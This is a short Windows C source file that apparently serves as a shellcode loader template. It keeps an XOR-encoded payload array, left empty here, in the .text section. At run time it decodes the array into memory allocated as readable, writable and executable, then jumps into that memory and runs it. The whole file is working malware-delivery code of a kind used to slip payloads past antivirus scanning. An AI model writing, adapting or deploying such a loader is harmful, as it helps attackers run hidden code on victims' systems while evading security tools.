#include <stdio.h>
#include <Windows.h>


//store the payload in the .text section 
#pragma section(".text")
__declspec(allocate(".text")) const unsigned char payload[] = {};

VOID XOR(IN BYTE* pShellcode, IN SIZE_T sShellcodeSize, IN BYTE bKey)
{
	for (SIZE_T i = 0; i < sShellcodeSize; i++)
	{
		pShellcode[i] = pShellcode[i] ^ bKey;
	}
}

int main()
{
	BYTE key = 0x90;
	size_t payload_size = sizeof(payload);

	LPVOID decrypted_payload = VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (decrypted_payload == NULL)
	{
		return -1;
	}

	memcpy(decrypted_payload, payload, payload_size);
	XOR((BYTE*)decrypted_payload, payload_size, key);

	void (*payload_func)() = (void(*)())decrypted_payload;
	payload_func();

	printf("[+] press enter to quit...");
	getchar();

	return 0;
}
